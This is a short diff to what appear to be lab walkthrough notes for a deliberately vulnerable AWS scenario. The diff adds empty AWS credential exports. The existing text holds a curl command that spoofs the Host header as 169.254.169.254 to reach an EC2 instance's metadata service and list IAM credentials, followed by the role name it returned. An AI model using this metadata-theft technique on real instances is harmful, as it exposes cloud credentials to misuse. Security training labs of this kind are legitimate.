@@ -1,3 +1,6 @@
+export AWS_ACCESS_KEY_ID=""
+export AWS_SECRET_ACCESS_KEY=""
+
 1. curl -s http://<ec2_external_IP>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'
 cg-banking-WAF-Role-cgid2odf2492zi
 
